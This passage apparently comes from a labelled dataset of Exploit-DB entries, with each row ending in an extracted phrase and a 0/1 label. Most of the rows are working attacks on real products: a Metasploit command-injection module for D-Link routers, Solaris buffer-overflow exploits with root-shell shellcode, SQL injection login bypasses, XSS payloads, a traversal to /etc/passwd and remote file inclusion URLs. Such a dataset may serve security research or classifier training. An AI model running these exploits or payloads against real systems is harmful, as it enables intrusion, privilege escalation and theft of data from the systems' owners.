vulnerability databases and similar, provided that due credit is given to the author. The author is not responsible for any misuse of the information contained herein and prohibits any malicious use of all security related information or exploits by the author or elsewhere.  by hyp3rlinx",inject specially crafted PHP command payloads,1
9079,"Opial 1.0 - Authentication Bypass ########################################################################### #-----------------------------I AM MUSLIM !!------------------------------# ###########################################################################  ==============================================================================                       _      _       _          _      _   _                       / \    | |     | |        / \    | | | |                     / _ \   | |     | |       / _ \   | |_| |                    / ___ \  | |___  | |___   / ___ \  |  _  |    IN THE NAME OF /_/   \_\ |_____| |_____| /_/   \_\ |_| |_|                                                                ==============================================================================         [Â»] ~Fleck i love you :D hahaha ==============================================================================         [Â»] Opial Version 1.0 (Auth Bypass) Remote Sql Injection ==============================================================================  	[Â»] Script:             [ Opial Version 1.0 ] 	[Â»] Language:           [ PHP ]         [Â»] Download:           [ http://www.opial.com/ ] 	[Â»] Founder:            [ Moudi or SixSo <m0udi@9.cn> ]         [Â»] Thanks to:          [ MiZoZ , ZuKa , str0ke , and all hackers... ]         [Â»] Team:               [ EvilWay ]         [Â»] SiteWeb:            [ Visit - www.opensc.ws ]         [Â»] Price:              [ $35 - $155 ]  ###########################################################################  ===[ Exploit SQL ]===	 	 	[Â»] http://www.site.com/patch/admin/          [Â»] User Name : admin' or '1=1         [Â»] Password  : leave empty here  ===[ LIVE DEMO ]===	          [Â»] http://www.opial.com/demo/admin/          [Â»] User Name : admin' or '1=1         [Â»] Password  :    Author: Moudi  ###########################################################################  # milw0rm.com [2009-07-02]",a malicious operator,1
31647,"CA 2E Web Option 8.1.2 - Authentication Bypass Vulnerability title: Unauthenticated Privilege Escalation in CA 2E Web Option  CVE: CVE-2014-1219 Vendor: CA Product: 2E Web Option Affected version: 8.1.2 Fixed version: N/A Reported by: Mike Emery  Details:  CA 2E Web Option (r8.1.2) and potentially others, is vulnerable to unauthenticated privilege escalation via a predictable session token. The POST parameter session token W2E_SSNID appears as follows:  W2E_SSNID=W90NIxGoSsN1023ZYW2E735182000013CLSpKfgkCJSLKsc600061JKenjKnE JuNX9GoVjCEbqIuKh6kFRvbzYnUxgQtONszJldyAar3LtTSwsmBLpdlPc5iDH4Zf75   However, this token is poorly validated, leading to  W2E_SSNID=W90NIxGoSsN1023ZYW2E735182000013  being accepted as a valid session. By incrementing and decrementing the digits at the end of the value given above, it is possible to control the session at the given ID. This token is sent as part of the login page, and as such, can be manipulated by an unauthenticated attacker, giving them access to any valid session. Consequentially, it is possible to access the following page as such:  https://app.domain.co.uk/web2edoc/close.htm?SSNID=W90NIxGoSsN1023ZYW2E735182000026  Ending the session specified, which could lead to a denial of service condition.  Further details at: http://portcullis-security.com/security-research-and-downloads/security-advisories/cve-2014-1219/   Copyright: Copyright (c) Portcullis Computer Security Limited 2014, All rights reserved worldwide. Permission is hereby granted for the electronic redistribution of this information. It is not to be edited or altered in any way without the express written consent of Portcullis Computer Security Limited.  Disclaimer: The information herein contained may change without notice. Use of this information constitutes acceptance for use in an AS IS condition. There are NO warranties, implied or otherwise, with regard to this information or its use. Any use of this information is at the user's risk. In no event shall the author/distributor (Portcullis Computer Security Limited) be held liable for any damages whatsoever arising out of or in connection with the use or spread of this information.",a predictable session token,1
20763,"Microsoft ISA Server 2000 Web Proxy - Denial of Service // source: https://www.securityfocus.com/bid/2600/info  It is possible for a user to cause the Web Proxy service on a host running MS ISA Server to stop responding.  If a HTTP request with an unusually long path is submitted, the Web Proxy service could stop responding.  This vulnerability is only exploitable from the internal network unless the Web Publishing service has been enabled, in which case it can be exploited from either internal or external networks. It is disabled by default.  A HTML email containing the malicious URL in an image tag or a javascript URL, could invoke a user's browser. An attempt to fulfill this request by the Web Proxy service, could instigate the denial of service condition on an internal users system. This is a potential way a remote attacker could exploit this vulnerability even if Web Publishing is disabled.  * It has been reported that the execution of arbitrary commands is possible. If this is the case the complete remote compromise of the host may be achievable. The latest findings have not been confirmed by anyone other than the person who posted about it.   /*  * repeat.c -- quick-n-dirty hack to output argv[2] instances of the  * character whose ASCII value is given as argv[1]  *  * WARNING - this has absolutely no error checking!  */  #include <stdio.h>  main (int argc, char **argv) {   int character;   long repetitions, i;    if ( argc != 3 ) {     printf(""usage: repeat char reps\n"");     exit(1);   }   character = atoi(argv[1]);   repetitions = atol(argv[2]);    for (i = 0L; i < repetitions; i++) {     printf (""%c"", character);   } }",a HTTP request with an unusually long path is submitted,1
34065,"D-Link Devices - UPnP M-SEARCH Multicast Command Injection (Metasploit) ## # This module requires Metasploit: http//metasploit.com/download # Current source: https://github.com/rapid7/metasploit-framework ##  require 'msf/core'  class Metasploit3 < Msf::Exploit::Remote   Rank = ExcellentRanking    include Msf::Exploit::CmdStager    def initialize(info = {})     super(update_info(info,       'Name'        => 'D-Link Unauthenticated UPnP M-SEARCH Multicast Command Injection',       'Description' => %q{         Different D-Link Routers are vulnerable to OS command injection via UPnP Multicast         requests. This module has been tested on DIR-300 and DIR-645 devices. Zachary Cutlip         has initially reported the DIR-815 vulnerable. Probably there are other devices also         affected.       },       'Author'      =>         [           'Zachary Cutlip', # Vulnerability discovery and initial exploit           'Michael Messner <devnull[at]s3cur1ty.de>' # Metasploit module and verification on other routers         ],       'License'     => MSF_LICENSE,       'References'  =>         [           ['URL', 'https://github.com/zcutlip/exploit-poc/tree/master/dlink/dir-815-a1/upnp-command-injection'], # original exploit           ['URL', 'http://shadow-file.blogspot.com/2013/02/dlink-dir-815-upnp-command-injection.html'] # original exploit         ],       'DisclosureDate' => 'Feb 01 2013',       'Privileged'     => true,       'Targets' =>         [           [ 'MIPS Little Endian',             {               'Platform' => 'linux',               'Arch'     => ARCH_MIPSLE             }           ],           [ 'MIPS Big Endian', # unknown if there are big endian devices out there             {               'Platform' => 'linux',               'Arch'     => ARCH_MIPS             }           ]         ],       'DefaultTarget'  => 0       ))      register_options(       [         Opt::RHOST(),         Opt::RPORT(1900)       ], self.class)      deregister_options('CMDSTAGER::DECODER', 'CMDSTAGER::FLAVOR')   end    def check     configure_socket      pkt =       ""M-SEARCH * HTTP/1.1\r\n"" +       ""Host:239.255.255.250:1900\r\n"" +       ""ST:upnp:rootdevice\r\n"" +       ""Man:\""ssdp:discover\""\r\n"" +       ""MX:2\r\n\r\n""      udp_sock.sendto(pkt, rhost, rport, 0)      res = nil     1.upto(5) do       res,_,_ = udp_sock.recvfrom(65535, 1.0)       break if res and res =~ /SERVER:\ Linux,\ UPnP\/1\.0,\ DIR-...\ Ver/mi       udp_sock.sendto(pkt, rhost, rport, 0)     end      # UPnP response:     # [*] 192.168.0.2:1900 SSDP Linux, UPnP/1.0, DIR-645 Ver 1.03 | http://192.168.0.2:49152/InternetGatewayDevice.xml | uuid:D02411C0-B070-6009-39C5-9094E4B34FD1::urn:schemas-upnp-org:device:InternetGatewayDevice:1     # we do not check for the Device ID (DIR-645) and for the firmware version because there are different     # dlink devices out there and we do not know all the vulnerable versions      if res && res =~ /SERVER:\ Linux,\ UPnP\/1.0,\ DIR-...\ Ver/mi       return Exploit::CheckCode::Detected     end      Exploit::CheckCode::Unknown   end    def execute_command(cmd, opts)     configure_socket      pkt =       ""M-SEARCH * HTTP/1.1\r\n"" +       ""Host:239.255.255.250:1900\r\n"" +       ""ST:uuid:`#{cmd}`\r\n"" +       ""Man:\""ssdp:discover\""\r\n"" +       ""MX:2\r\n\r\n""      udp_sock.sendto(pkt, rhost, rport, 0)   end    def exploit     print_status(""#{rhost}:#{rport} - Trying to access the device via UPnP ..."")      unless check == Exploit::CheckCode::Detected       fail_with(Failure::Unknown, ""#{rhost}:#{rport} - Failed to access the vulnerable device"")     end      print_status(""#{rhost}:#{rport} - Exploiting..."")     execute_cmdstager(       :flavor  => :echo,       :linemax => 950     )   end    # the packet stuff was taken from the module miniupnpd_soap_bof.rb   # We need an unconnected socket because SSDP replies often come   # from a different sent port than the one we sent to. This also   # breaks the standard UDP mixin.   def configure_socket     self.udp_sock = Rex::Socket::Udp.create({       'Context'   => { 'Msf' => framework, 'MsfExploit' => self }     })     add_socket(self.udp_sock)   end    #   # Required since we aren't using the normal mixins   #    def rhost     datastore['RHOST']   end    def rport     datastore['RPORT']   end    # Accessor for our UDP socket   attr_accessor :udp_sock  end",UPnP Multicast requests,1
46882,"TP-LINK TL-WR840N v5 00000005 - Cross-Site Scripting # Exploit Title: TL-WR840N v5 00000005  # Date: 5/10/2019  # Exploit Author: purnendu ghosh  # Vendor Homepage: https://www.tp-link.com/  # Software Link: https://www.amazon.in/TP-LINK-TL-WR840N-300Mbps-Wireless-External/dp/B01A0G1J7Q  # Category: Hardware  # Firmware Version:0.9.1 3.16 v0001.0 Build 171211 Rel.58800n  # Hardware Version:TL-WR840N v5 00000005  # Tested on: Windows 10  # CVE :CVE-2019-12195.    # Proof Of Concept:  TP-Link TL-WR840N v5 00000005 devices allow XSS via the network name. The attacker must log into the router by breaking the password and going to the admin login page by THC-HYDRA to get the network name. With an XSS payload, the network name changed automatically and the internet connection was disconnected. All the users become disconnected from the internet.  ------------------------------------------  [Additional Information] To ensure your network to be safe from Renaming and internet disconnection.  ------------------------------------------  [Vulnerability Type] Cross Site Scripting (XSS)  ------------------------------------------  [Vendor of Product] tp-link  ------------------------------------------  [Affected Product Code Base] router - TL-WR840N v5 00000005  ------------------------------------------  [Affected Component] Wi-Fi network configured through the router  ------------------------------------------  [Attack Type] Remote  ------------------------------------------  [Impact Denial of Service] true  ------------------------------------------  [Impact Information Disclosure] true  ------------------------------------------  [Attack Vectors] Logged in to the router by breaking the password and goes to the admin login page by THC-HYDRA and got the network name. Using Burp Suite professional version 1.7.32 captured the network name and selected XSS payload against the name and started attacking .as a result the network name changed automatically and internet connection was disconnected in the network. All the users become disconnected from internet.  ------------------------------------------  [Discoverer] purnendu ghosh  [Reference] https://www.tp-link.com/us/security",breaking the password and going to the admin login page by THC-HYDRA to get the network name,1
34070,Datetopia Match Agency BiZ - Multiple Cross-Site Scripting Vulnerabilities source: https://www.securityfocus.com/bid/40488/info  Datetopia Match Agency BiZ is prone to multiple cross-site scripting vulnerabilities because the application fails to properly sanitize user-supplied input.  An attacker may leverage these issues to execute arbitrary script code in the browser of an unsuspecting user in the context of the affected site. This may allow the attacker to steal cookie-based authentication credentials and to launch other attacks.  http://www.example.com/smilies_popup.php?details_var=%3E%22%3E%3CScRiPt%20%0a%0d%3Ealert(666)%3B%3C/ScRiPt%3E http://www.example.com/manage_pictures.php?profile_id=%3E%22%3E%3CScRiPt%20%0a%0d%3Ealert(666)%3B%3C/ScRiPt%3E,a specially crafted HTTP request,1
26272,EPay Pro 2.0 - 'index.php' Directory Traversal source: https://www.securityfocus.com/bid/14871/info  EPay Pro is prone to a directory traversal vulnerability. This is due to a lack of proper validation of user-supplied input.  An unauthorized user can retrieve arbitrary files by supplying directory traversal strings '../' to the vulnerable parameter. Exploitation of this vulnerability could lead to a loss of confidentiality. Information obtained may aid in further attacks against the underlying system; other attacks are also possible.  http://www.example.com/index.php?read=../../../../../../../../../../../../../../etc/passwd,supplying directory traversal strings '../' to the vulnerable parameter,1
20893,"Trend Micro Interscan VirusWall for Windows NT 3.4/3.5/3.51 - Remote Reconfiguration source: https://www.securityfocus.com/bid/2808/info  Interscan Viruswall is a Virus scanning software package distributed and maintained by Trend Micro. It is designed to scan for virus occurances in both incoming and outgoing traffic via SMTP, FTP, and HTTP at the gateway of the network.  The management interface used with the Interscan Viruswall uses several programs in a cgi directory that may allow a remote attacker to make configuration changes using maliciously-constructed querystrings submitted to the host.   Examples:  http://target/interscan/cgi-bin/FtpSave.dll?no http://target/interscan/cgi-bin/FtpSave.dll?yes http://target/interscan/cgi-bin/FtpSave.dll?I'm%20here",maliciously-constructed querystrings submitted to the host,1
41438,"WordPress Plugin Mail Masta 1.0 - SQL Injection # Exploit Title: Multiple SQL injection vulnerabilities in Mail Masta (aka mail-masta) plugin 1.0 for Wordpress. # Date: 02/18/2017 # Exploit Author: Hanley Shun # Vendor Homepage: https://wpcore.com/plugin/mail-masta # Software Link: https://www.exploit-db.com/apps/78745b48b15bf2b81153556ef1c8ec48-mail-masta.zip # Version: 1.0 # Tested on: Kali Linux x64, Ubuntu 14.04 x64 # CVE : [CVE-2017-6095, CVE-2017-6096, CVE-2017-6097, CVE-2017-6098]   Mail-Masta SQL Injection  Page: ./wp-content/plugins/mail-masta/inc/lists/csvexport.php (Unauthenticated)  GET Parameter: list_id  http://my_wp_app/wp-content/plugins/mail-masta/inc/lists/csvexport.php?list_id=0+OR+1%3D1&pl=/var/www/html/wordpress/wp-load.php   csvexport.php:  $list_id=$_GET['list_id']; global $wpdb; $mail_subscribers = $wpdb->prefix . ""masta_subscribers""; $masta_list = $wpdb->prefix . ""masta_list""; $check_sql = ""SELECT * FROM $mail_subscribers WHERE list_id = $list_id""; $check_list=""SELECT * FROM $masta_list WHERE list_id= $list_id""; $wp_list=$wpdb->get_results($check_sql); $wp_list_s=$wpdb->get_results($check_list);   Page: ./wp-content/plugins/mail-masta/inc/lists/view-list.php (Requires Wordpress admin)  GET Parameter: filter_list  http://my_wp_app/wp-admin/admin.php?page=masta-lists&action=view_list&filter_list=0+OR+1%3D1   view-list.php:  global $wpdb; $list_id = $_GET['filter_list']; $masta_list = $wpdb->prefix . ""masta_list""; $masta_subscribers = $wpdb->prefix . ""masta_subscribers""; $listdata = $wpdb->get_results( $wpdb->prepare(""SELECT * FROM $masta_list WHERE list_id= $list_id"",$query)); $list_subscribers = $wpdb->get_var( $wpdb->prepare(""SELECT COUNT( `list_id` ) FROM $masta_subscribers WHERE list_id= $list_id AND status=1"",$query));   Page: ./wp-content/plugins/mail-masta/inc/campaign/count_of_send.php (Requires Wordpress admin)  POST Parameter: camp_id  http://my_wp_app/wp-content/plugins/mail-masta/inc/campaign/count_of_send.php/?pl=/var/www/html/wordpress/wp-load.php   count_of_send.php:  include($_GET['pl']); global $wpdb; $camp_id=$_POST['camp_id']; $masta_reports = $wpdb->prefix . ""masta_reports""; $count=$wpdb->get_results(""SELECT count(*) co from  $masta_reports where camp_id=$camp_id and status=1"");   Page: ./wp-content/plugins/mail-masta/inc/campaign_save.php (Requires Wordpress admin)  POST Parameter: list_id  campaign_save.php:  $list_id=$_POST['list_id']; $check_list = $wpdb->get_var(""SELECT count(id) FROM wp_masta_subscribers where list_id=$list_id"");   POST /wp-admin/admin-ajax.php?id= HTTP/1.1  ...snip...  action=my_action&url=%2Fvar%2Fwww%2Fhtml%2Fwp-content%2Fplugins%2Fmail-masta%2Finc%2Fcampaign_save.php&sender_selected_list_check=check&list_id=1+OR+1%3D1",any malicious use,0
28027,ISPConfig 2.2.3 - Multiple Remote File Inclusions source: https://www.securityfocus.com/bid/18441/info  ISPConfig is prone to multiple remote file-include vulnerabilities. These issues are due to a failure in the application to properly sanitize user-supplied input.  An attacker can exploit these issues to include arbitrary remote files containing malicious PHP code and execute it in the context of the webserver process. This may allow the attacker to compromise the application and the underlying system; other attacks are also possible.  These issues affect version 2.2.3; other versions may also be vulnerable.  The vendor reports a properly installed instance of ISPConfig is not vulnerable to these issues.  http://www.example.com/[ic_path]/install_ispconfig/scripts/lib/server.inc.php?go_info[isp][classes_root]=[cmd_url]/ http://www.example.com/[ic_path]/install_ispconfig/ispconfig/lib/app.inc.php?go_info[server][classes_root]=[cmd_url]/ http://www.example.com/[ic_path]/install_ispconfig/ispconfig/web/login/login.php?go_info[server][classes_root]=[cmd_url]/ http://www.example.com/[ic_path]/install_ispconfig/ispconfig/web/login/trylogin.php?go_info[server][classes_root]=[cmd_url]/,include arbitrary remote files containing malicious PHP code and execute it in the context of the webserver process,1
20772,"Solaris 2.5/2.6/7.0/8 - 'mailx -F' Local Buffer Overflow (1) // source: https://www.securityfocus.com/bid/2610/info  Solaris is the variant of the UNIX Operating System distributed by Sun Microsystems. Solaris is designed as a scalable operating system for the Intel x86 and Sun Sparc platforms, and operates on machines varying from desktop to enterprise server.  A problem with the handling of a long string of characters by the -F option makes it possible for a local user to gain elevated privileges. Due to the insufficient handling of input by the -F option of mailx, a buffer overflow at 1150 characters makes it possible to overwrite variables on the stack, including the return address.  This problem makes it possible for a local user gain elevated privileges, attaining an effective GID of mail.   #include <fcntl.h>  /*     /usr/bin/mailx overflow proof of conecpt.      Pablo Sor, Buenos Aires, Argentina 04/2001    psor@afip.gov.ar, psor@ccc.uba.ar     works against x86 solaris 8     default offset should work.     usage:     bash$ id    uid=100(laika) gid=1(other)     bash$ ./mailx-exp    Subject: tomy    .    EOT     [wait...]     $ id    uid=100(laika) gid=1(other) egid=6(mail)   */  long get_esp() { __asm__(""movl %esp,%eax""); }  int main(int ac, char **av) {  char shell[]= ""\xeb\x1c\x5e\x33\xc0\x33\xdb\xb3\x08\xfe\xc3\x2b\xf3\x88\x06"" ""\x6a\x06\x50\xb0\x88\x9a\xff\xff\xff\xff\x07\xee\xeb\x06\x90"" ""\xe8\xdf\xff\xff\xff\x55\x8b\xec\x83\xec\x08\xeb\x5d\x33\xc0"" ""\xb0\x3a\xfe\xc0\xeb\x16\xc3\x33\xc0\x40\xeb\x10\xc3\x5e\x33"" ""\xdb\x89\x5e\x01\xc6\x46\x05\x07\x88\x7e\x06\xeb\x05\xe8\xec"" ""\xff\xff\xff\x9a\xff\xff\xff\xff\x0f\x0f\xc3\x5e\x33\xc0\x89"" ""\x76\x08\x88\x46\x07\x33\xd2\xb2\x06\x02\xd2\x89\x04\x16\x50"" ""\x8d\x46\x08\x50\x8b\x46\x08\x50\xe8\xb5\xff\xff\xff\x33\xd2"" ""\xb2\x06\x02\xd2\x03\xe2\x6a\x01\xe8\xaf\xff\xff\xff\x83\xc4"" ""\x04\xe8\xc9\xff\xff\xff\x2f\x74\x6d\x70\x2f\x78\x78"";   unsigned long magic = get_esp() + 2075;  /* default offset */  unsigned char buf[1150];  char *envi;   envi = (char *)malloc(300*sizeof(char));  memset(envi,0x90,300);  memcpy(envi+280-strlen(shell),shell,strlen(shell));  memcpy(envi,""SOR="",4);  envi[299]=0;  putenv(envi);   symlink(""/bin/ksh"",""/tmp/xx"");  memset(buf,0x41,1150);  memcpy(buf+1116,&magic,4);  buf[1149]=0;  execl(""/usr/bin/mailx"",""mailx"",""-F"",buf,NULL); }",a long string of characters by the -F option,1
48359,"Oracle Solaris Common Desktop Environment 1.6 - Local Privilege Escalation # Title: Oracle Solaris Common Desktop Environment 1.6 - Local Privilege Escalation # Date: 2020-04-21 # Author: Marco Ivaldi # Vendor: www.oracle.com # CVE: CVE-2020-2944  /*  * raptor_sdtcm_conv.c - CDE sdtcm_convert LPE for Solaris/Intel  * Copyright (c) 2019-2020 Marco Ivaldi <raptor@0xdeadbeef.info>  *  * A buffer overflow in the _SanityCheck() function in the Common Desktop  * Environment version distributed with Oracle Solaris 10 1/13 (Update 11) and  * earlier allows local users to gain root privileges via a long calendar name  * or calendar owner passed to sdtcm_convert in a malicious calendar file  * (CVE-2020-2944).  *  * The open source version of CDE (based on the CDE 2.x codebase) is not  * affected, because it does not ship the vulnerable binary.  *  * ""CDE, the gift that keeps on giving"" -- @0xdea  * ""Feels more like a curse you can't break from this side."" -- @alanc  *  * This exploit uses the ret-into-ld.so technique to bypass the non-exec stack  * protection. In case troubles arise with NULL-bytes inside the ld.so.1 memory  * space, try returning to sprintf() instead of strcpy().  *  * I haven't written a Solaris/SPARC version because I don't have a SPARC box  * on which Solaris 10 can run. If anybody is kind enough to give me access to  * such a box, I'd be happy to port my exploit to Solaris/SPARC as well.  *  * Usage:  * $ gcc raptor_sdtcm_conv.c -o raptor_sdtcm_conv -Wall  * $ ./raptor_sdtcm_conv  * [...]  * Do you want to correct it? (Y/N) [Y] n  * # id  * uid=0(root) gid=1(other) egid=12(daemon)  * #  *  * This should work with any common configuration on the first try. To  * re-enable rpc.cmsd, clear its service maintenance status by running the  * following commands as root:  * # /usr/sbin/svcadm clear cde-calendar-manager  * # /usr/bin/svcs -a | grep calendar  * online         13:16:54 svc:/network/rpc/cde-calendar-manager:default  *  * Tested on:  * SunOS 5.10 Generic_147148-26 i86pc i386 i86pc (Solaris 10 1/13)  * [previous Solaris versions are also likely vulnerable]  */  #include <fcntl.h> #include <link.h> #include <procfs.h> #include <stdio.h> #include <stdlib.h> #include <strings.h> #include <unistd.h> #include <sys/stat.h> #include <sys/systeminfo.h> #include <sys/types.h>  #define INFO1	""raptor_sdtcm_conv.c - CDE sdtcm_convert LPE for Solaris/Intel"" #define INFO2	""Copyright (c) 2019-2020 Marco Ivaldi <raptor@0xdeadbeef.info>""  #define	VULN	""/usr/dt/bin/sdtcm_convert""	// the vulnerable program #define ADMIN	""/usr/dt/bin/sdtcm_admin""	// calendar admin utility #define	BUFSIZE	2304				// size of the name/owner #define PAYSIZE	1024				// size of the payload #define OFFSET	env_len / 2			// offset to the shellcode  char sc[] = /* Solaris/x86 shellcode (8 + 8 + 27 = 43 bytes) */ /* double setuid() */ ""\x31\xc0\x50\x50\xb0\x17\xcd\x91"" ""\x31\xc0\x50\x50\xb0\x17\xcd\x91"" /* execve() */ ""\x31\xc0\x50\x68/ksh\x68/bin"" ""\x89\xe3\x50\x53\x89\xe2\x50"" ""\x52\x53\xb0\x3b\x50\xcd\x91"";  /* globals */ char	*env[256]; int	env_pos = 0, env_len = 0;  /* prototypes */ int	add_env(char *string); void	check_zero(int addr, char *pattern); int	search_ldso(char *sym); int	search_rwx_mem(void); void	set_val(char *buf, int pos, int val);  /*  * main()  */ int main(int argc, char **argv) { 	char	buf[BUFSIZE], payload[PAYSIZE]; 	char	platform[256], release[256], hostname[256]; 	int	i, payaddr;  	char	*arg[3] = {""foo"", ""hax0r"", NULL}; 	int	sb = ((int)argv[0] | 0xfff);	/* stack base */ 	int	ret = search_ldso(""strcpy"");	/* or sprintf */ 	int	rwx_mem = search_rwx_mem();	/* rwx memory */  	char	cmd[1024]; 	FILE	*fp;  	/* print exploit information */ 	fprintf(stderr, ""%s\n%s\n\n"", INFO1, INFO2);  	/* read command line */ 	if (argc != 1) { 		fprintf(stderr, ""Usage:\n%s\n[...]\n"", argv[0]); 		fprintf(stderr, ""Do you want to correct it? (Y/N) [Y] n\n\n""); 		exit(1); 	}  	/* get system information */ 	sysinfo(SI_PLATFORM, platform, sizeof(platform) - 1); 	sysinfo(SI_RELEASE, release, sizeof(release) - 1); 	sysinfo(SI_HOSTNAME, hostname, sizeof(release) - 1);  	/* prepare the payload (NOPs suck, but I'm too old for VOODOO stuff) */ 	memset(payload, '\x90', PAYSIZE); 	payload[PAYSIZE - 1] = 0x0; 	memcpy(&payload[PAYSIZE - sizeof(sc)], sc, sizeof(sc));  	/* fill the envp, keeping padding */ 	add_env(payload); 	add_env(""HOME=/tmp""); 	add_env(NULL);  	/* calculate the payload address */ 	payaddr = sb - OFFSET;  	/* prepare the evil palette name */ 	memset(buf, 'A', sizeof(buf)); 	buf[sizeof(buf) - 1] = 0x0;  	/* fill with function address in ld.so.1, saved eip, and arguments */ 	for (i = 0; i < BUFSIZE - 16; i += 4) { 		set_val(buf, i, ret);		/* strcpy */ 		set_val(buf, i += 4, rwx_mem);	/* saved eip */ 		set_val(buf, i += 4, rwx_mem);	/* 1st argument */ 		set_val(buf, i += 4, payaddr);	/* 2nd argument */ 	}  	/* print some output */ 	fprintf(stderr, ""Using SI_PLATFORM\t: %s (%s)\n"", platform, release); 	fprintf(stderr, ""Using SI_HOSTNAME\t: %s\n"", hostname); 	fprintf(stderr, ""Using stack base\t: 0x%p\n"", (void *)sb); 	fprintf(stderr, ""Using rwx_mem address\t: 0x%p\n"", (void *)rwx_mem); 	fprintf(stderr, ""Using payload address\t: 0x%p\n"", (void *)payaddr); 	fprintf(stderr, ""Using strcpy() address\t: 0x%p\n\n"", (void *)ret);  	/* create the evil calendar file */ 	fprintf(stderr, ""Preparing the evil calendar file... ""); 	snprintf(cmd, sizeof(cmd), ""%s -a -c hax0r@%s"", ADMIN, hostname); 	if (system(cmd) == -1) { 		perror(""Error creating calendar file""); 		exit(1); 	} 	if (chmod(""/usr/spool/calendar/callog.hax0r"", 0660) == -1) { 		perror(""Error creating calendar file""); 		exit(1); 	}  	/* prepare the evil calendar file (badchars currently not handled) */ 	fp = fopen(""/usr/spool/calendar/callog.hax0r"", ""w""); 	if (!fp) { 		perror(""Error preparing calendar file""); 		exit(1); 	} 	fprintf(fp, ""Version: 4\n(calendarattributes "" 		    ""(\""-//XAPIA/CSA/CALATTR//NONSGML Access List//EN\"","" 		    ""\""10:access_list\"",\""world:2\"")\n""); 	/* buffer overflow in calendar name */ 	fprintf(fp, ""(\""-//XAPIA/CSA/CALATTR//NONSGML Calendar Name//EN\"","" 		    ""\""5:string\"",\""%s\"")\n"", buf); 	fprintf(fp, ""(\""-//XAPIA/CSA/CALATTR//NONSGML Calendar Owner//EN\"","" 		    ""\""6:user\"",\""fnord\"")\n)""); 	/* buffer overflow in calendar owner */ 	/* 	fprintf(fp, ""(\""-//XAPIA/CSA/CALATTR//NONSGML Calendar Name//EN\"","" 		    ""\""5:string\"",\""hax0r\"")\n""); 	fprintf(fp, ""(\""-//XAPIA/CSA/CALATTR//NONSGML Calendar Owner//EN\"","" 		    ""\""6:user\"",\""%s\"")\n)"", buf); 	*/ 	fclose(fp);  	fprintf(stderr, ""Done.\n"");  	/* run the vulnerable program */ 	fprintf(stderr, ""Exploiting... Please answer \""n\"" when prompted.\n""); 	execve(VULN, arg, env); 	perror(""execve""); 	exit(0); }  /*  * add_env(): add a variable to envp and pad if needed  */ int add_env(char *string) { 	int	i;  	/* null termination */ 	if (!string) { 		env[env_pos] = NULL; 		return env_len; 	}  	/* add the variable to envp */ 	env[env_pos] = string; 	env_len += strlen(string) + 1; 	env_pos++;  	/* pad the envp using zeroes */ 	if ((strlen(string) + 1) % 4) 		for (i = 0; i < (4 - ((strlen(string)+1)%4)); i++, env_pos++) { 			env[env_pos] = string + strlen(string); 			env_len++; 		}  	return env_len; }  /*  * check_zero(): check an address for the presence of a 0x00  */ void check_zero(int addr, char *pattern) { 	if (!(addr & 0xff) || !(addr & 0xff00) || !(addr & 0xff0000) || 	    !(addr & 0xff000000)) { 		fprintf(stderr, ""Error: %s contains a 0x00!\n"", pattern); 		exit(1); 	} }  /*  * search_ldso(): search for a symbol inside ld.so.1  */ int search_ldso(char *sym) { 	int		addr; 	void		*handle; 	Link_map	*lm;  	/* open the executable object file */ 	if ((handle = dlmopen(LM_ID_LDSO, NULL, RTLD_LAZY)) == NULL) { 		perror(""dlopen""); 		exit(1); 	}  	/* get dynamic load information */ 	if ((dlinfo(handle, RTLD_DI_LINKMAP, &lm)) == -1) { 		perror(""dlinfo""); 		exit(1); 	}  	/* search for the address of the symbol */ 	if ((addr = (int)dlsym(handle, sym)) == NULL) { 		fprintf(stderr, ""Sorry, function %s() not found\n"", sym); 		exit(1); 	}  	/* close the executable object file */ 	dlclose(handle);  	check_zero(addr - 4, sym); 	return addr; }  /*  * search_rwx_mem(): search for an RWX memory segment valid for all  * programs (typically, /usr/lib/ld.so.1) using the proc filesystem  */ int search_rwx_mem(void) { 	int	fd; 	char	tmp[16]; 	prmap_t	map; 	int	addr = 0, addr_old;  	/* open the proc filesystem */ 	sprintf(tmp,""/proc/%d/map"", (int)getpid()); 	if ((fd = open(tmp, O_RDONLY)) < 0) { 		fprintf(stderr, ""Can't open %s\n"", tmp); 		exit(1); 	}  	/* search for the last RWX memory segment before stack (last - 1) */ 	while (read(fd, &map, sizeof(map))) 		if (map.pr_vaddr) 			if (map.pr_mflags & (MA_READ | MA_WRITE | MA_EXEC)) { 				addr_old = addr; 				addr = map.pr_vaddr; 			} 	close(fd);  	/* add 4 to the exact address NULL bytes */ 	if (!(addr_old & 0xff)) 		addr_old |= 0x04; 	if (!(addr_old & 0xff00)) 		addr_old |= 0x0400;  	return addr_old; }  /*  * set_val(): copy a dword inside a buffer (little endian)  */ void set_val(char *buf, int pos, int val) { 	buf[pos] =	(val & 0x000000ff); 	buf[pos + 1] =	(val & 0x0000ff00) >> 8; 	buf[pos + 2] =	(val & 0x00ff0000) >> 16; 	buf[pos + 3] =	(val & 0xff000000) >> 24; }",a long calendar name or calendar owner passed to sdtcm_convert in a malicious calendar file,1
23901,"pfSense 2.0.1 - Cross-Site Scripting / Cross-Site Request Forgery / Remote Command Execution ###################################################################### # Exploit Title: pfSense 2.0.1 XSS & CSRF Remote root Access # Date: 04/01/2013 # Author: Yann CAM @ Synetis # Vendor or Software Link: www.pfsense.org # Version: 2.0.1 # Category: XSS & CSRF Remote root Access # Google dork: # Tested on: FreeBSD ######################################################################    pfSense firewall/router distribution description : ======================================================================  pfSense is a free, open source customized distribution of FreeBSD tailored for use as a firewall and router. In addition to being a powerful, flexible firewalling and routing platform, it includes a long list of related features and a package system allowing further expandability without adding bloat and potential security vulnerabilities to the base distribution. pfSense is a popular project with more than 1 million downloads since its inception, and proven in countless installations ranging from small home networks protecting a PC and an Xbox to large corporations, universities and other organizations protecting thousands of network devices.   This project started in 2004 as a fork of the m0n0wall project, but focused towards full PC installations rather than the embedded hardware focus of m0n0wall. pfSense also offers an embedded image for Compact Flash based installations, however it is not our primary focus.  In version 2.0.1 of the distribution, differents vulnerabilities XSS & CSRF RCE reverse root shell can be used. It is strongly advised to update to version 2.0.2 available now.    Proof of Concept 1 : ======================================================================  Potential XSS protected with CSRFMagic with information disclosure :  File /usr/local/www/progress.php lines 21-30 :   $X = upload_progress_meter_get_info( $_GET[""UPLOAD_IDENTIFIER""] );   if (!$X) {       if ( array_key_exists( ""e"", $_GET ) ) {        echo ""<HTML><BODY onLoad='window.close();'>"" . gettext(""Invalid Meter ID"") . ""! {$_GET[""UPLOAD_IDENTIFIER""]}"";        echo ('</BODY></HTML>');      }else{        echo ('<HTML><meta HTTP-EQUIV=""Refresh"" CONTENT=""1; url='. $url 